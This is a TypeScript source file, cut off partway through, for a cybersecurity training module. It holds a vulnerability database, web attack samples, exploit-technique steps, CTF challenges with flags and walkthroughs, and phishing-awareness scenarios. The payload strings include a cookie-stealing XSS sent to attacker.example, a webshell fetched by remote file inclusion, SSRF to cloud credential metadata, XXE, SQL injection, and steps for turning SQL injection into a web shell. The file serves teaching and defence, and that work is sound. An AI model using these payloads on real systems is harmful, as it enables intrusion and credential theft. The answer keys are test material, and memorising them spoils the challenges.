/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                             ║
 * ║          🛡️  S E C U R I T Y   T R A I N E R                                ║
 * ║                                                                             ║
 * ║   Cybersecurity training & penetration testing knowledge:                    ║
 * ║     analyze → train → assess → remediate                                    ║
 * ║                                                                             ║
 * ║     • Vulnerability analysis with OWASP / CWE classification                ║
 * ║     • Penetration testing methodology walkthroughs                          ║
 * ║     • Network, web-app, and cryptography security training                  ║
 * ║     • CTF challenge generation with hints & walkthroughs                    ║
 * ║     • Social engineering awareness & incident response                      ║
 * ║     • Skill assessment with personalized training paths                     ║
 * ║                                                                             ║
 * ║   No external dependencies. Fully self-contained.                           ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

// ── Types ────────────────────────────────────────────────────────────────────

export interface SecurityTrainerConfig {
  maxChallenges: number;
  difficultyProgression: boolean;
  enabledCategories: string[];
  penTestMethodology: 'owasp' | 'ptes' | 'osstmm';
  maxAuditFindings: number;
  enableHints: boolean;
  scoringWeight: number;
}

export interface SecurityTrainerStats {
  totalTrainingSessions: number;
  totalChallengesGenerated: number;
  totalVulnAnalyses: number;
  totalAudits: number;
  challengesCompleted: number;
  avgScore: number;
  feedbackCount: number;
}

export interface VulnerabilityInfo {
  id: string;
  name: string;
  category: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  description: string;
  impact: string;
  remediation: string;
  cweId: string;
  references: string[];
}

export interface PenTestPhase {
  name: 'reconnaissance' | 'scanning' | 'exploitation' | 'post-exploitation' | 'reporting';
  description: string;
  techniques: string[];
  tools: string[];
  outputs: string[];
}

export interface PenTestScenario {
  name: string;
  target: string;
  methodology: string;
  phases: PenTestPhase[];
  tools: string[];
  objectives: string[];
  difficulty: number;
}

export interface NetworkAnalysis {
  topology: string;
  openPorts: number[];
  services: string[];
  vulnerabilities: string[];
  recommendations: string[];
}

export interface WebVulnerability {
  type: 'xss' | 'sqli' | 'csrf' | 'ssrf' | 'lfi' | 'rfi' | 'auth-bypass' | 'idor' | 'xxe';
  description: string;
  payload: string;
  impact: string;
  remediation: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
}

export interface CryptoChallenge {
  algorithm: string;
  difficulty: number;
  description: string;
  hint: string;
  concept: string;
  commonMistakes: string[];
}

export interface SocialEngineering {
  type: 'phishing' | 'pretexting' | 'baiting' | 'tailgating' | 'vishing';
  scenario: string;
  indicators: string[];
  defenses: string[];
}

export interface CTFChallenge {
  id: string;
  category: 'web' | 'crypto' | 'forensics' | 'reverse' | 'pwn' | 'misc';
  title: string;
  description: string;
  difficulty: number;
  points: number;
  hints: string[];
  flag: string;
  solutionWalkthrough: string;
}

export interface ExploitTechnique {
  name: string;
  category: string;
  description: string;
  prerequisites: string[];
  steps: string[];
  mitigations: string[];
  educationalNote: string;
}

export interface AuditFinding {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  category: string;
  description: string;
  evidence: string;
  remediation: string;
  effort: 'low' | 'medium' | 'high';
}

export interface SecurityAudit {
  target: string;
  findings: AuditFinding[];
  riskScore: number;
  complianceStatus: string;
  recommendations: string[];
  frameworks: string[];
}

export interface IncidentResponse {
  phase: 'detection' | 'containment' | 'eradication' | 'recovery' | 'lessons';
  actions: string[];
  tools: string[];
  timeline: string;
  artifacts: string[];
}

export interface SecuritySkillAssessment {
  overallLevel: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  scores: Record<string, number>;
  gaps: string[];
  strengths: string[];
  trainingPath: string[];
}

export interface TrainingModule {
  id: string;
  title: string;
  category: string;
  difficulty: number;
  prerequisites: string[];
  content: string;
  exercises: string[];
  estimatedTime: number;
}

// ── Constants ────────────────────────────────────────────────────────────────

const DEFAULT_CONFIG: SecurityTrainerConfig = {
  maxChallenges: 50,
  difficultyProgression: true,
  enabledCategories: [
    'web', 'crypto', 'forensics', 'reverse', 'pwn', 'misc',
    'network', 'social-engineering', 'incident-response',
  ],
  penTestMethodology: 'owasp',
  maxAuditFindings: 100,
  enableHints: true,
  scoringWeight: 1.0,
};

// ── Vulnerability Database ───────────────────────────────────────────────────

function buildVulnerabilityDatabase(): VulnerabilityInfo[] {
  const vulns: VulnerabilityInfo[] = [];

  const add = (
    name: string, category: string,
    severity: VulnerabilityInfo['severity'],
    description: string, impact: string,
    remediation: string, cweId: string,
    references: string[] = [],
  ) => {
    vulns.push({
      id: `VULN-${vulns.length + 1}`,
      name, category, severity, description, impact,
      remediation, cweId, references,
    });
  };

  // ── OWASP Top 10 ──
  add('SQL Injection', 'injection', 'critical',
    'User input is concatenated directly into SQL queries without sanitization',
    'Full database compromise, data exfiltration, authentication bypass',
    'Use parameterized queries or prepared statements; apply input validation',
    'CWE-89', ['OWASP A03:2021']);
  add('Cross-Site Scripting (XSS)', 'injection', 'high',
    'Untrusted data is included in web output without proper escaping',
    'Session hijacking, defacement, credential theft',
    'Context-aware output encoding; Content Security Policy headers',
    'CWE-79', ['OWASP A03:2021']);
  add('Broken Authentication', 'authentication', 'critical',
    'Weak credential handling allows attackers to compromise accounts',
    'Account takeover, identity theft, unauthorized access',
    'Implement MFA, strong password policies, secure session management',
    'CWE-287', ['OWASP A07:2021']);
  add('Insecure Direct Object Reference', 'access-control', 'high',
    'Application exposes internal object identifiers without authorization checks',
    'Unauthorized data access, horizontal privilege escalation',
    'Enforce server-side authorization checks; use indirect references',
    'CWE-639', ['OWASP A01:2021']);
  add('Security Misconfiguration', 'configuration', 'medium',
    'Default credentials, open cloud storage, verbose error messages, unnecessary features enabled',
    'Information disclosure, unauthorized access, system compromise',
    'Harden configurations, disable defaults, implement security headers',
    'CWE-16', ['OWASP A05:2021']);
  add('Cross-Site Request Forgery', 'session', 'medium',
    'Application does not verify that requests originate from authenticated users intentionally',
    'Unauthorized state changes on behalf of authenticated users',
    'Implement anti-CSRF tokens; use SameSite cookie attribute',
    'CWE-352', ['OWASP A01:2021']);
  add('Server-Side Request Forgery', 'injection', 'high',
    'Application fetches remote resources based on user-supplied URLs without validation',
    'Internal network scanning, cloud metadata access, data exfiltration',
    'Allowlist permitted URLs; block internal IP ranges; disable redirects',
    'CWE-918', ['OWASP A10:2021']);
  add('XML External Entity (XXE)', 'injection', 'high',
    'XML parser processes external entity references from untrusted input',
    'File disclosure, SSRF, denial of service',
    'Disable external entity processing; use less complex data formats like JSON',
    'CWE-611', ['OWASP A05:2021']);
  add('Insecure Deserialization', 'injection', 'critical',
    'Application deserialises untrusted data without integrity checks',
    'Remote code execution, replay attacks, privilege escalation',
    'Avoid deserialising untrusted data; enforce type constraints and integrity checks',
    'CWE-502', ['OWASP A08:2021']);
  add('Using Components with Known Vulnerabilities', 'supply-chain', 'high',
    'Application depends on libraries or frameworks with publicly known vulnerabilities',
    'Varies by vulnerability — may include RCE, data breach, DoS',
    'Maintain an SBOM; automate dependency scanning; apply patches promptly',
    'CWE-1035', ['OWASP A06:2021']);
  add('Insufficient Logging and Monitoring', 'operations', 'medium',
    'Application lacks adequate logging, alerting, and monitoring capabilities',
    'Delayed breach detection, inability to perform forensic analysis',
    'Implement centralized logging, alerting thresholds, log integrity controls',
    'CWE-778', ['OWASP A09:2021']);
  add('Cryptographic Failures', 'cryptography', 'critical',
    'Sensitive data transmitted or stored without proper encryption',
    'Data exposure, credential theft, compliance violations',
    'Encrypt data at rest and in transit; use strong algorithms; manage keys properly',
    'CWE-327', ['OWASP A02:2021']);

  // ── Additional Common Vulnerabilities ──
  add('Buffer Overflow', 'memory', 'critical',
    'Writing beyond buffer boundaries overwrites adjacent memory',
    'Code execution, denial of service, privilege escalation',
    'Use memory-safe languages or bounds checking; enable ASLR, DEP, stack canaries',
    'CWE-120');
  add('Path Traversal', 'file-system', 'high',
    'User-controlled file paths allow access to files outside intended directory',
    'Arbitrary file read/write, configuration disclosure',
    'Canonicalise paths; use chroot or containers; validate against allowlist',
    'CWE-22');
  add('Command Injection', 'injection', 'critical',
    'User input is passed unsanitized to system shell commands',
    'Arbitrary command execution with application privileges',
    'Avoid shell invocations; use parameterized APIs; strict input validation',
    'CWE-78');
  add('Race Condition', 'concurrency', 'medium',
    'Time-of-check to time-of-use gap allows exploitation of shared resources',
    'Privilege escalation, data corruption, authentication bypass',
    'Use atomic operations, file locks, or transactions',
    'CWE-362');
  add('Privilege Escalation', 'access-control', 'critical',
    'Attacker gains higher privileges than authorized through flawed logic',
    'Full system compromise, administrative access',
    'Principle of least privilege; validate permissions on every request',
    'CWE-269');

  return vulns;
}

// ── Web Vulnerability Patterns ───────────────────────────────────────────────

function buildWebVulnerabilityPatterns(): WebVulnerability[] {
  return [
    {
      type: 'xss',
      description: 'Reflected XSS via unsanitized query parameter echoed in response',
      payload: '<script>document.location="https://attacker.example/steal?c="+document.cookie</script>',
      impact: 'Session hijacking, credential theft, phishing redirection',
      remediation: 'Apply context-aware output encoding; deploy Content-Security-Policy',
      severity: 'high',
    },
    {
      type: 'sqli',
      description: 'Union-based SQL injection in search parameter',
      payload: "' UNION SELECT username,password FROM users--",
      impact: 'Full database access, authentication bypass, data exfiltration',
      remediation: 'Use parameterized queries; apply least-privilege database accounts',
      severity: 'critical',
    },
    {
      type: 'csrf',
      description: 'State-changing POST endpoint lacks anti-CSRF token validation',
      payload: '<form action="https://target.example/transfer" method="POST"><input name="amount" value="10000"/></form>',
      impact: 'Unauthorized transactions, profile changes, privilege modification',
      remediation: 'Implement synchroniser token pattern; use SameSite=Strict cookies',
      severity: 'medium',
    },
    {
      type: 'ssrf',
      description: 'URL parameter used in server-side HTTP request without validation',
      payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      impact: 'Cloud credential theft, internal network scanning, data exfiltration',
      remediation: 'Allowlist target hosts; block RFC-1918 ranges; disable HTTP redirects',
      severity: 'high',
    },
    {
      type: 'lfi',
      description: 'File include path constructed from user input without validation',
      payload: '../../../../etc/passwd',
      impact: 'Sensitive file disclosure, configuration exposure, potential RCE',
      remediation: 'Canonicalise paths; enforce allowlist of permitted files',
      severity: 'high',
    },
    {
      type: 'rfi',
      description: 'Remote file inclusion via user-controlled URL parameter',
      payload: 'http://attacker.example/webshell.txt',
      impact: 'Remote code execution, full server compromise',
      remediation: 'Disable remote file includes; validate URLs against strict allowlist',
      severity: 'critical',
    },
    {
      type: 'auth-bypass',
      description: 'Authentication check relies solely on client-side validation',
      payload: 'Modify isAdmin cookie or JWT claim to true',
      impact: 'Full administrative access, unauthorized functionality',
      remediation: 'Enforce server-side authentication; validate tokens cryptographically',
      severity: 'critical',
    },
    {
      type: 'idor',
      description: 'API endpoint uses sequential user IDs without authorization checks',
      payload: 'GET /api/users/1234/profile → GET /api/users/1235/profile',
      impact: 'Horizontal privilege escalation, mass data harvesting',
      remediation: 'Implement server-side authorization; use opaque identifiers',
      severity: 'high',
    },
    {
      type: 'xxe',
      description: 'XML parser processes external entities from untrusted document',
      payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      impact: 'Local file disclosure, SSRF, denial of service',
      remediation: 'Disable DTD processing; use JSON where possible',
      severity: 'high',
    },
  ];
}

// ── Exploit Technique Knowledge Base ─────────────────────────────────────────

function buildExploitTechniques(): ExploitTechnique[] {
  return [
    {
      name: 'Stack Buffer Overflow',
      category: 'memory-corruption',
      description: 'Overwrite the return address on the stack to redirect execution',
      prerequisites: ['Understanding of stack memory layout', 'Knowledge of calling conventions', 'Binary analysis skills'],
      steps: [
        'Identify input that is copied to a stack buffer without bounds checking',
        'Determine the offset from the buffer to the saved return address',
        'Craft payload: padding + return address + optional NOP sled + shellcode',
        'Deliver payload and verify control of instruction pointer',
      ],
      mitigations: ['Stack canaries (SSP)', 'ASLR', 'DEP/NX bit', 'Use memory-safe languages'],
      educationalNote: 'Buffer overflows are foundational to understanding memory corruption. Modern mitigations make exploitation harder but not impossible.',
    },
    {
      name: 'Return-Oriented Programming (ROP)',
      category: 'memory-corruption',
      description: 'Chain short instruction sequences (gadgets) ending in RET to execute arbitrary logic',
      prerequisites: ['Buffer overflow basics', 'x86/x64 assembly', 'Binary reverse engineering'],
      steps: [
        'Gain control of the stack via a buffer overflow',
        'Identify usable gadgets in the binary or loaded libraries',
        'Build a ROP chain that performs desired operations (e.g., mprotect + shellcode)',
        'Place the chain on the stack and trigger execution',
      ],
      mitigations: ['ASLR randomises gadget addresses', 'CFI restricts valid branch targets', 'Shadow stacks protect return addresses'],
      educationalNote: 'ROP bypasses DEP/NX by reusing existing code. It is a core technique in modern binary exploitation.',
    },
    {
      name: 'Format String Attack',
      category: 'memory-corruption',
      description: 'Exploit printf-family functions called with user-controlled format strings',
      prerequisites: ['Understanding of printf internals', 'Stack layout knowledge', 'Binary analysis'],
      steps: [
        'Identify a printf-family call that passes user input as the format string',
        'Use %x or %p to leak stack values and locate targets',
        'Use %n to write a controlled value to an arbitrary address',
        'Overwrite GOT entry or return address to redirect execution',
      ],
      mitigations: ['Never pass user input as a format string', 'Compiler warnings (-Wformat-security)', 'RELRO to protect GOT'],
      educationalNote: 'Format string vulnerabilities provide both read and write primitives, making them powerful despite their simplicity.',
    },
    {
      name: 'Race Condition (TOCTOU)',
      category: 'logic',
      description: 'Exploit the time gap between a security check and the use of checked resource',
      prerequisites: ['Understanding of concurrency', 'File system or kernel internals'],
      steps: [
        'Identify a check-then-use pattern (e.g., access() then open())',
        'Create a symbolic link or swap the resource between check and use',
        'Time the swap using tight loops or inotify to maximise success rate',
        'Repeat until the race is won',
      ],
      mitigations: ['Use atomic operations (e.g., open with O_NOFOLLOW)', 'Avoid TOCTOU patterns', 'Operate in restricted directories'],
      educationalNote: 'Race conditions are non-deterministic, making them tricky to exploit reliably. Kernel-level TOCTOU bugs are especially impactful.',
    },
    {
      name: 'Privilege Escalation via SUID Binary',
      category: 'privilege-escalation',
      description: 'Abuse misconfigured SUID binaries to gain elevated privileges',
      prerequisites: ['Linux permissions model', 'Shell scripting', 'Binary behaviour analysis'],
      steps: [
        'Enumerate SUID binaries: find / -perm -4000 2>/dev/null',
        'Check each binary against GTFOBins for known escalation paths',
        'Craft the appropriate invocation to spawn a privileged shell',
        'Verify escalated privileges with id or whoami',
      ],
      mitigations: ['Minimise SUID binaries', 'Use capabilities instead of SUID', 'Regular file-system audits'],
      educationalNote: 'SUID escalation is one of the most common Linux privilege escalation techniques tested in CTFs and real assessments.',
    },
    {
      name: 'SQL Injection to Remote Code Execution',
      category: 'web-exploitation',
      description: 'Leverage SQL injection to write files or execute commands on the database server',
      prerequisites: ['SQL injection basics', 'Database-specific features', 'File-system permissions'],
      steps: [
        'Confirm SQL injection and determine the DBMS type',
        'Enumerate database privileges (FILE, xp_cmdshell, etc.)',
        'Use INTO OUTFILE, COPY, or xp_cmdshell to write a web shell or execute commands',
        'Interact with the shell to establish persistent access',
      ],
      mitigations: ['Parameterized queries', 'Least-privilege database accounts', 'Disable dangerous functions', 'WAF rules'],
      educationalNote: 'SQLi-to-RCE demonstrates how a single vulnerability class can chain to full system compromise when database permissions are excessive.',
    },
  ];
}

// ── CTF Challenge Templates ──────────────────────────────────────────────────

function buildCTFChallenges(): CTFChallenge[] {
  let counter = 0;
  const id = () => `CTF-${++counter}`;

  return [
    {
      id: id(), category: 'web', title: 'Cookie Monster',
      description: 'The admin panel checks your role via a cookie. Can you become admin?',
      difficulty: 1, points: 100,
      hints: ['Inspect the cookies set by the application', 'What happens if you change the role value?'],
      flag: 'FLAG{c00k13_m0nst3r_adm1n}',
      solutionWalkthrough: 'Inspect cookies in browser dev-tools. Find "role=user" cookie. Change value to "role=admin". Refresh the admin page to retrieve the flag.',
    },
    {
      id: id(), category: 'web', title: 'SQL Playground',
      description: 'The login form seems fragile. Can you authenticate without valid credentials?',
      difficulty: 2, points: 200,
      hints: ['Try classic SQL injection payloads', 'What if the password field is vulnerable?'],
      flag: 'FLAG{sql_1nj3ct10n_ftw}',
      solutionWalkthrough: "Enter ' OR '1'='1 in the password field. The query becomes SELECT * FROM users WHERE password='' OR '1'='1', bypassing authentication.",
    },
    {
      id: id(), category: 'crypto', title: 'Caesar Salad',
      description: 'Decrypt this message: GUVF VF GUR SYNT: PNRFNE_PVCURE',
      difficulty: 1, points: 100,
      hints: ['This is a substitution cipher', 'ROT13 is a special case of Caesar cipher'],
      flag: 'FLAG{CAESAR_CIPHER}',
      solutionWalkthrough: 'Apply ROT13 decryption. Each letter shifts 13 positions. GUVF → THIS, SYNT → FLAG, PNRFNE_PVCURE → CAESAR_CIPHER.',
    },
    {
      id: id(), category: 'crypto', title: 'Base Jumping',
      description: 'Decode: RkxBR3tiYXNlNjRfZDNjMGQzZH0=',
      difficulty: 1, points: 50,
      hints: ['The trailing = is a padding character in a common encoding', 'This is not encryption, just encoding'],
      flag: 'FLAG{base64_d3c0d3d}',
      solutionWalkthrough: 'Recognise Base64 encoding (alphanumeric + /+ with = padding). Decode to get the flag.',
    },
    {
      id: id(), category: 'forensics', title: 'Hidden in Plain Sight',
      description: 'An image file seems normal but contains secret data. Extract the hidden message.',
      difficulty: 2, points: 200,
      hints: ['Try examining the file with strings or a hex editor', 'Data may be appended after the image end marker'],
      flag: 'FLAG{st3g0_h1dd3n_d4t4}',
      solutionWalkthrough: 'Run strings on the image file or open in a hex editor. After the JPEG EOI marker (FF D9), find the appended flag text.',
    },
    {
      id: id(), category: 'forensics', title: 'Packet Detective',
      description: 'Analyze the provided PCAP file to find credentials transmitted in cleartext.',
      difficulty: 3, points: 300,
      hints: ['Filter for HTTP or FTP traffic', 'Look for POST requests or AUTH commands'],
      flag: 'FLAG{cl34rt3xt_cr3ds}',
      solutionWalkthrough: 'Open the PCAP in Wireshark. Filter for http.request.method == POST or ftp. Follow the TCP stream to find username and password in plaintext.',
    },
    {
      id: id(), category: 'reverse', title: 'String Theory',
      description: 'A binary asks for a password. Find the correct one.',
      difficulty: 2, points: 200,
      hints: ['Static analysis can reveal embedded strings', 'Try using the strings utility or a disassembler'],
      flag: 'FLAG{str1ngs_r3v34l}',
      solutionWalkthrough: 'Run strings on the binary to find the hardcoded comparison string. Alternatively, open in a disassembler and find the strcmp call.',
    },
    {
      id: id(), category: 'reverse', title: 'XOR Unlock',
      description: 'The binary XORs your input with a key and compares the result. Reverse the logic.',
      difficulty: 3, points: 300,
      hints: ['XOR is its own inverse', 'Find the key and the expected output in the binary'],
      flag: 'FLAG{x0r_r3v3rs3d}',
      solutionWalkthrough: 'Disassemble to find the XOR key and expected cipher-text. XOR the cipher-text with the key to recover the plaintext flag.',
    },
    {
      id: id(), category: 'pwn', title: 'Overflow 101',
      description: 'A vulnerable binary reads input into a small buffer. Redirect execution to the win function.',
      difficulty: 2, points: 250,
      hints: ['The buffer is on the stack, close to the return address', 'Find the address of the win() function'],
      flag: 'FLAG{buff3r_0v3rfl0w}',
      solutionWalkthrough: 'Determine buffer size with a cyclic pattern. Overwrite the return address with the address of win(). Pipe the payload into the binary.',
    },
    {
      id: id(), category: 'pwn', title: 'Format Fury',
      description: 'The program calls printf(user_input). Exploit the format string vulnerability to read the flag from memory.',
      difficulty: 3, points: 350,
      hints: ['%x or %p leak stack values', 'The flag string is stored on the stack'],
      flag: 'FLAG{f0rm4t_str1ng}',
      solutionWalkthrough: 'Send a series of %p to leak stack values. Convert the hex values to ASCII. Identify the leaked flag string in the output.',
    },
    {
      id: id(), category: 'misc', title: 'Git Secrets',
      description: 'A developer accidentally committed a secret to the repository. Find it.',
      difficulty: 1, points: 100,
      hints: ['Check the git history, not just the current files', 'Try git log and git diff'],
      flag: 'FLAG{g1t_h1st0ry_l34k}',
      solutionWalkthrough: 'Run git log --all --oneline then git diff or git show on each commit. The secret was added then removed, but still exists in history.',
    },
    {
      id: id(), category: 'misc', title: 'DNS Exfiltration',
      description: 'Suspicious DNS queries were captured. Decode the exfiltrated data.',
      difficulty: 4, points: 400,
      hints: ['Check the subdomain labels in the DNS queries', 'The data may be hex or base32 encoded'],
      flag: 'FLAG{dns_3xf1ltr4t10n}',
      solutionWalkthrough: 'Extract subdomain labels from the DNS queries. Concatenate them and decode from hex/base32 to reveal the flag.',
    },
  ];
}

// ── Social Engineering Scenarios ─────────────────────────────────────────────

function buildSocialEngineeringScenarios(): SocialEngineering[] {
  return [
    {
      type: 'phishing',
      scenario: 'An email claims your account will be locked in 24 hours unless you verify your identity via a provided link.',
      indicators: [
        'Urgency and fear tactics',
        'Generic greeting instead of personalization',
        'Suspicious sender domain (e.g., support@acc0unt-verify.example)',
        'Link URL does not match legitimate domain',
        'Grammar or spelling errors',
      ],
      defenses: [
        'Verify sender address carefully',
        'Hover over links before clicking',
        'Contact the organization directly through known channels',
        'Enable email filtering and SPF/DKIM/DMARC',
        'Use phishing-resistant MFA (hardware keys)',
      ],
    },
    {
      type: 'pretexting',
      scenario: 'A caller claims to be from IT support and needs your password to apply an urgent security patch.',
      indicators: [
        'Unsolicited contact claiming to be internal',
        'Requesting credentials directly',
        'Creating urgency around a fictional incident',
        'Unable to verify identity through normal channels',
      ],
      defenses: [
        'Never share credentials over phone or email',
        'Call back using the official IT helpdesk number',
        'Verify the caller identity through internal directory',
        'Report suspicious requests to security team',
      ],
    },
    {
      type: 'baiting',
      scenario: 'A USB drive labelled "Salary Information Q4" is found in the car park.',
      indicators: [
        'Labelled to provoke curiosity',
        'Left in a conspicuous location',
        'Unknown origin',
      ],
      defenses: [
        'Never insert unknown removable media',
        'Report found devices to security',
        'Disable USB auto-run via group policy',
        'Use endpoint detection that scans removable media',
      ],
    },
    {
      type: 'tailgating',
      scenario: 'Someone carrying boxes asks you to hold the secure door open because their badge is in their pocket.',
      indicators: [
        'Person is unknown to you',
        'Carrying items to prevent badge use',
        'Attempting to bypass physical access controls',
      ],
      defenses: [
        'Politely ask them to badge in themselves',
        'Offer to hold items while they badge in',
        'Report repeated attempts to physical security',
        'Implement mantrap or turnstile access',
      ],
    },
    {
      type: 'vishing',
      scenario: 'A voicemail from your "bank" asks you to call back and confirm your account number and PIN.',
      indicators: [
        'Unsolicited call requesting sensitive information',
        'Callback number differs from official number',
        'Automated message with urgency cues',
        'Requesting PIN or full account number',
      ],
      defenses: [
        'Never provide sensitive info to inbound callers',
        'Call the number on the back of your card instead',
        'Enable voice-call spam filtering',
        'Register with do-not-call lists',
      ],
    },
  ];
}

// ── Training Module Templates ────────────────────────────────────────────────

function buildTrainingModules(): TrainingModule[] {
  let counter = 0;
  const id = () => `MOD-${++counter}`;

  return [
    {
      id: id(), title: 'Introduction to Network Security',
      category: 'network', difficulty: 1, prerequisites: [],
      content: 'Covers the OSI model, TCP/IP fundamentals, common protocols, and basic network security concepts including firewalls, IDS/IPS, and network segmentation.',
      exercises: ['Map a network topology from a traceroute output', 'Identify open ports using scan results', 'Write basic firewall rules for a DMZ'],
      estimatedTime: 120,
    },
    {
      id: id(), title: 'Web Application Security Fundamentals',
      category: 'web', difficulty: 1, prerequisites: ['HTTP basics', 'HTML/JavaScript'],
      content: 'Introduction to the OWASP Top 10, HTTP request/response cycle, same-origin policy, cookies and sessions, and common web vulnerabilities.',
      exercises: ['Identify XSS in sample code', 'Spot SQL injection points in a login form', 'Review a CSRF-vulnerable endpoint'],
      estimatedTime: 150,
    },
    {
      id: id(), title: 'Cryptography Essentials',
      category: 'crypto', difficulty: 2, prerequisites: ['Basic mathematics'],
      content: 'Symmetric encryption (AES, ChaCha20), asymmetric encryption (RSA, ECC), hash functions (SHA-256), digital signatures, PKI, and common cryptographic mistakes.',
      exercises: ['Identify the weakness in ECB mode', 'Verify a digital signature chain', 'Spot a hardcoded encryption key in code'],
      estimatedTime: 180,
    },
    {
      id: id(), title: 'Penetration Testing Methodology',
      category: 'pentest', difficulty: 2, prerequisites: ['Network fundamentals', 'Linux CLI'],
      content: 'PTES and OWASP testing frameworks, reconnaissance techniques, vulnerability scanning, exploitation basics, post-exploitation, and professional reporting.',
      exercises: ['Plan a pen-test scope document', 'Perform passive reconnaissance on a test domain', 'Write an executive summary for a finding'],
      estimatedTime: 240,
    },
    {
      id: id(), title: 'Incident Response and Digital Forensics',
      category: 'incident-response', difficulty: 3, prerequisites: ['OS internals', 'Network security'],
      content: 'NIST IR lifecycle, evidence acquisition and preservation, memory forensics, log analysis, timeline reconstruction, and post-incident review processes.',
      exercises: ['Create an incident timeline from log excerpts', 'Identify IOCs in sample alerts', 'Draft an incident post-mortem'],
      estimatedTime: 200,
    },
    {
      id: id(), title: 'Binary Exploitation Fundamentals',
      category: 'pwn', difficulty: 3, prerequisites: ['C programming', 'x86 assembly', 'Linux internals'],
      content: 'Stack and heap memory layouts, buffer overflows, format strings, ROP chains, modern mitigations (ASLR, DEP, canaries), and bypass techniques.',
      exercises: ['Exploit a stack buffer overflow on a training binary', 'Build a ROP chain to call system()', 'Bypass stack canaries with a format string leak'],
      estimatedTime: 300,
    },
    {
      id: id(), title: 'Social Engineering Defence',
      category: 'social-engineering', difficulty: 1, prerequisites: [],
      content: 'Types of social engineering attacks, psychological principles exploited (authority, urgency, scarcity), phishing analysis, pretexting, and organizational defences.',
      exercises: ['Analyze phishing emails for red flags', 'Role-play a pretexting phone call', 'Design a security awareness poster'],
      estimatedTime: 90,
    },
    {
      id: id(), title: 'Advanced Web Exploitation',
      category: 'web', difficulty: 4, prerequisites: ['Web security fundamentals', 'JavaScript', 'HTTP'],
      content: 'Server-Side Template Injection, prototype pollution, OAuth/OIDC attacks, race conditions in web apps, WebSocket security, and advanced deserialization attacks.',
      exercises: ['Exploit SSTI in a Jinja2 template', 'Chain IDOR with CSRF for account takeover', 'Identify prototype pollution in a Node.js app'],
      estimatedTime: 240,
    },
  ];
}

// ── Helpers ──────────────────────────────────────────────────────────────────

function clamp(value: number, min: number, max: number): number {
  return Math.max(min, Math.min(max, value));
}

function round2(n: number): number {
  return Math.round(n * 100) / 100;
}

function generateId(prefix: string): string {
  return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
}

function tokenize(text: string): string[] {
  return text
    .toLowerCase()
    .replace(/[^a-z0-9\s-]/g, ' ')
    .split(/\s+/)
    .filter(w => w.length > 1);
}

function tokenSimilarity(textA: string, textB: string): number {
  const tokensA = tokenize(textA);
  const tokensB = tokenize(textB);
  if (tokensA.length === 0 && tokensB.length === 0) return 1;
  if (tokensA.length === 0 || tokensB.length === 0) return 0;

  let matches = 0;
  for (const ta of tokensA) {
    for (const tb of tokensB) {
      if (ta === tb) { matches++; break; }
      if (ta.length > 3 && tb.length > 3) {
        if (ta.includes(tb) || tb.includes(ta)) { matches += 0.5; break; }
      }
    }
  }
  return clamp(matches / Math.max(tokensA.length, tokensB.length), 0, 1);
}

function severityToScore(severity: VulnerabilityInfo['severity']): number {
  switch (severity) {
    case 'critical': return 9.5;
    case 'high': return 7.5;
    case 'medium': return 5.0;
    case 'low': return 3.0;
    case 'info': return 1.0;
  }
}

function pickItems<T>(items: T[], count: number): T[] {
  const shuffled = [...items];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled.slice(0, count);
}

// ── Main Class ──────────────────────────────────────────────────────────────

export class SecurityTrainer {
  private readonly config: SecurityTrainerConfig;
  private readonly vulnDB: VulnerabilityInfo[];
  private readonly webVulnPatterns: WebVulnerability[];
  private readonly exploitDB: ExploitTechnique[];
  private readonly ctfChallenges: CTFChallenge[];
  private readonly socialEngDB: SocialEngineering[];
  private readonly trainingModules: TrainingModule[];
  private totalTrainingSessions = 0;
  private totalChallengesGenerated = 0;
  private totalVulnAnalyses = 0;
  private totalAudits = 0;
  private challengesCompleted = 0;
  private scoreHistory: number[] = [];
  private feedbackCount = 0;

  constructor(config?: Partial<SecurityTrainerConfig>) {
    this.config = { ...DEFAULT_CONFIG, ...config };
    this.vulnDB = buildVulnerabilityDatabase();
    this.webVulnPatterns = buildWebVulnerabilityPatterns();
    this.exploitDB = buildExploitTechniques();
    this.ctfChallenges = buildCTFChallenges();
    this.socialEngDB = buildSocialEngineeringScenarios();
    this.trainingModules = buildTrainingModules();
  }

  // ── Vulnerability Analysis ──────────────────────────────────────────────

  /** Analyze a description and return matching vulnerability information. */
  analyseVulnerability(description: string): VulnerabilityInfo[] {
    this.totalVulnAnalyses++;
    const results: Array<{ vuln: VulnerabilityInfo; score: number }> = [];

    for (const vuln of this.vulnDB) {
      const nameSim = tokenSimilarity(description, vuln.name);
      const descSim = tokenSimilarity(description, vuln.description);
      const catSim = tokenSimilarity(description, vuln.category);
      const score = Math.max(nameSim, descSim, catSim * 0.8);
      if (score >= 0.25) {
        results.push({ vuln, score });
      }
    }

    results.sort((a, b) => b.score - a.score);
    return results.slice(0, 10).map(r => r.vuln);
  }

  /** Compute a CVSS-like severity score for a description. */
  computeSeverityScore(description: string): { score: number; severity: VulnerabilityInfo['severity']; breakdown: Record<string, number> } {
    const matches = this.analyseVulnerability(description);
    if (matches.length === 0) {
      return { score: 0, severity: 'info', breakdown: {} };
    }

    const breakdown: Record<string, number> = {};
    let total = 0;
    for (const m of matches.slice(0, 5)) {
      const s = severityToScore(m.severity);
      breakdown[m.name] = s;
      total += s;
    }

    const avgScore = round2(total / Math.min(matches.length, 5));
    const severity: VulnerabilityInfo['severity'] =
      avgScore >= 9 ? 'critical' :
      avgScore >= 7 ? 'high' :
      avgScore >= 4 ? 'medium' :
      avgScore >= 2 ? 'low' : 'info';

    return { score: avgScore, severity, breakdown };
  }

  /** Map the attack surface for a given target description. */
  mapAttackSurface(targetDescription: string): { vectors: string[]; vulnerabilities: VulnerabilityInfo[]; riskLevel: string } {
    const vulns = this.analyseVulnerability(targetDescription);
    const vectors: string[] = [];

    const lower = targetDescription.toLowerCase();
